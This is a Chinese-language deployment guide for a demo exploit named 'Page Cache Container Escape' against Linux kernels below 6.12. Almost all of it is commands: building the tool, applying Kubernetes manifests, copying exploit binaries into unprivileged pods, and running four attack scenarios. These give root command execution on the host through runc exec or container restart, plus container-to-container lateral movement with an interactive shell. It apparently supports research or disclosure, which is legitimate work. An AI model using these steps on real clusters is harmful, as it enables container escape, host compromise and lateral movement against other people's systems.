# Page Cache Container Escape - Demo 部署指南

## 前置条件

- 内核 < 6.12（包含 Copy Fail 漏洞的版本）
- runc（动态链接版本，路径二需要）
- K8s 集群（或 Docker 环境）

## 构建

```bash
# 在 Linux 上编译（需要 gcc + go）
make

# 或用 Docker 构建
docker build -t pcce:latest .
```

## 部署

```bash
# 创建 namespace
kubectl apply -f deploy/namespace.yaml

# 部署测试 Pod
kubectl apply -f deploy/pcce-exec.yaml
kubectl apply -f deploy/pcce-restart.yaml
kubectl apply -f deploy/page-inject.yaml

# 等待 Pod Running
kubectl get pods -n pcce-demo -w
```

## 复制 exploit 到容器

```bash
# pcce 工具
kubectl cp ./pcce pcce-demo/pcce-exec:/tmp/pcce
kubectl cp ./pcce pcce-demo/pcce-restart:/tmp/pcce

# page_inject 工具（如果有）
kubectl cp ./page_inject pcce-demo/attacker:/tmp/page_inject
```

## 演示 1: pcce exec（利用健康检查，全自动）

Pod 已配 livenessProbe exec，kubelet 每 5 秒触发 runc exec。

```bash
# 运行 exploit，等待自动触发（约 5 秒）
kubectl exec -n pcce-demo pcce-exec -- /tmp/pcce exec --cmd 'id > /tmp/pwned-exec'

# 验证（在宿主机上）
cat /tmp/pwned-exec
# uid=0(root) gid=0(root) groups=0(root)
```

## 演示 2: pcce exec（手动触发，无健康检查）

```bash
# 终端 1: 启动 exploit，等待触发
kubectl exec -n pcce-demo pcce-manual -- /tmp/pcce exec --cmd 'id > /tmp/pwned-manual' --timeout 0

# 终端 2: 触发 runc exec（任何 kubectl exec 都行）
kubectl exec -n pcce-demo pcce-manual -- /bin/sh -c 'echo trigger'

# 验证
cat /tmp/pwned-manual
```

## 演示 3: pcce restart（利用容器重启，全自动）

不需要任何外部触发，exploit 自己 crash 容器后等 kubelet 重启。

```bash
# 运行 exploit，容器会 crash 并自动重启
kubectl exec -n pcce-demo pcce-restart -- /tmp/pcce restart --cmd 'id > /tmp/pwned-restart'

# 等待 ~20 秒，容器经历 crash → 重启(injector执行) → 再重启(payload执行) → 恢复
kubectl get pod -n pcce-demo pcce-restart -w

# 验证
cat /tmp/pwned-restart
# uid=0(root) gid=0(root) groups=0(root)

# runc 自动恢复
runc --version
```

## 演示 4: page_inject（横向移动，容器打容器）

```bash
# 在攻击者容器里运行 page_inject
kubectl exec -it -n pcce-demo attacker -- /tmp/page_inject

# 等待注入完成，进入交互 shell
# 选择目标容器（victim-web/victim-api/victim-db）
# 执行命令

# 清理
# 宿主机执行: echo 3 > /proc/sys/vm/drop_caches
```

## 清理

```bash
kubectl delete namespace pcce-demo

# 宿主机清理 page cache（恢复被修改的文件）
echo 3 > /proc/sys/vm/drop_caches

# 清理 payload 产物
rm -f /tmp/pwned-*
```

## 注意事项

- livenessProbe 必须是 `exec` 类型才能触发 runc exec。`httpGet` 和 `tcpSocket` 类型由 kubelet 直接处理，不经过 runc
- restart 模式要求 runc 是动态链接的（有 PT_INTERP 段）
- 所有 Pod 以 uid=1000 运行，没有任何特权
- 攻击只修改 page cache（内存），不修改磁盘文件
- `echo 3 > /proc/sys/vm/drop_caches` 可以立即恢复所有被修改的文件
